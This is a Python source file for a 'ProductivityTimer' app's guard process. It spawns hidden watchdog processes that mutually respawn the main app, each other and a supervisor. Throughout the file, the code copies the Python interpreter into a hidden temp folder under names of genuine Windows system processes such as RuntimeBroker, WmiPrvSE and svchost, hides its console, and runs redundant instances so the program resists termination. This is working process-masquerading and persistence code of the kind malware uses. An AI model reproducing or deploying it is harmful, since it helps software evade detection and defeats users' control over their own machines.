"""
Standalone guard process that monitors and respawns the main app.
Can be run as a separate process with different disguised names.
Multiple instances can run simultaneously for redundancy.

Usage:
    pythonw.exe guard_runner.py <guard_id>
"""

import sys
import os
import time
import subprocess
import ctypes
import shutil
import tempfile

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))


RESPAWN_DELAY = 0.3
CHECK_INTERVAL = 0.1
MAIN_APP_PROC_NAME = "RuntimeBroker"
GUARD_PROC_NAMES = ["SearchIndexer", "WmiPrvSE", "audiodg"]
SUPERVISOR_MUTEX = "ProductivityTimer_Supervisor_Mutex"
_DISGUISE_DIR = os.path.join(tempfile.gettempdir(), ".sysrt")


def hide_console():
    """Hide the console window."""
    try:
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        user32 = ctypes.WinDLL('user32', use_last_error=True)
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)  # SW_HIDE
    except Exception:
        pass


def is_app_running():
    """Check if the main app process is running by looking for its mutex."""
    kernel32 = ctypes.windll.kernel32
    mutex_name = "ProductivityTimer_SingleInstance_Mutex"
    # Try to open the existing mutex (don't create it)
    handle = kernel32.OpenMutexW(0x00100000, False, mutex_name)  # SYNCHRONIZE
    if handle:
        kernel32.CloseHandle(handle)
        return True
    return False


def _get_disguised_exe(name):
    """Get path to a disguised copy of pythonw. Creates it if missing."""
    os.makedirs(_DISGUISE_DIR, exist_ok=True)
    target = os.path.join(_DISGUISE_DIR, f"{name}.exe")
    if not os.path.exists(target):
        pythonw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
        if not os.path.exists(pythonw):
            pythonw = sys.executable
        shutil.copy2(pythonw, target)
    return target


def start_app():
    """Start the main app process with a disguised process name."""
    script_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    main_script = os.path.join(script_dir, "src", "main.py")
    exe = _get_disguised_exe(MAIN_APP_PROC_NAME)

    try:
        subprocess.Popen(
            [exe, main_script],
            cwd=script_dir,
            creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0),
        )
        return True
    except Exception as e:
        print(f"[Guard] Failed to start app: {e}")
        return False


def _is_mutex_held(mutex_name):
    """Check if a mutex exists (i.e. the owning process is alive)."""
    kernel32 = ctypes.windll.kernel32
    handle = kernel32.OpenMutexW(0x00100000, False, mutex_name)  # SYNCHRONIZE
    if handle:
        kernel32.CloseHandle(handle)
        return True
    return False


def _is_guard_running(guard_id):
    """Check if a specific guard is running by its mutex."""
    return _is_mutex_held(f"ProductivityTimer_Guard_{guard_id}_Mutex")


def _is_supervisor_running():
    """Check if the supervisor is running by its mutex."""
    return _is_mutex_held(SUPERVISOR_MUTEX)


def _respawn_guard(guard_id):
    """Respawn a dead guard process."""
    script_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    guard_script = os.path.join(script_dir, "src", "core", "guard_runner.py")
    idx = int(guard_id) - 1
    guard_name = GUARD_PROC_NAMES[idx] if idx < len(GUARD_PROC_NAMES) else f"svchost_{idx}"
    exe = _get_disguised_exe(guard_name)
    try:
        subprocess.Popen(
            [exe, guard_script, str(guard_id)],
            cwd=script_dir,
            creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0),
        )
        return True
    except Exception:
        return False


def _respawn_supervisor():
    """Respawn the supervisor process."""
    script_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    run_script = os.path.join(script_dir, "run.py")
    pythonw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
    if not os.path.exists(pythonw):
        pythonw = sys.executable
    try:
        subprocess.Popen(
            [pythonw, run_script],
            cwd=script_dir,
            creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0),
        )
        return True
    except Exception:
        return False


def run_guard(guard_id="1"):
    """Main guard loop - watches app, other guards, and supervisor. Respawns anything dead."""
    # Acquire guard-specific mutex so we don't run duplicate guards with same ID
    kernel32 = ctypes.windll.kernel32
    mutex_name = f"ProductivityTimer_Guard_{guard_id}_Mutex"
    handle = kernel32.CreateMutexW(None, True, mutex_name)
    ERROR_ALREADY_EXISTS = 183
    if kernel32.GetLastError() == ERROR_ALREADY_EXISTS:
        sys.exit(0)  # This guard ID is already running

    hide_console()

    # Give the app time to start on first run
    time.sleep(3)

    all_guard_ids = ["1", "2", "3"]

    while True:
        try:
            # Watch the main app
            if not is_app_running():
                time.sleep(RESPAWN_DELAY)
                if not is_app_running():
                    print(f"[Guard {guard_id}] App not running! Respawning...")
                    start_app()
                    time.sleep(3)

            # Watch other guards — respawn any that died
            for gid in all_guard_ids:
                if gid == guard_id:
                    continue  # Don't check ourselves
                if not _is_guard_running(gid):
                    print(f"[Guard {guard_id}] Guard {gid} is dead! Respawning...")
                    _respawn_guard(gid)

            # Watch the supervisor — respawn if dead
            if not _is_supervisor_running():
                print(f"[Guard {guard_id}] Supervisor is dead! Respawning...")
                _respawn_supervisor()

        except Exception as e:
            print(f"[Guard {guard_id}] Error: {e}")

        time.sleep(CHECK_INTERVAL)


if __name__ == "__main__":
    guard_id = sys.argv[1] if len(sys.argv) > 1 else "1"
    run_guard(guard_id)
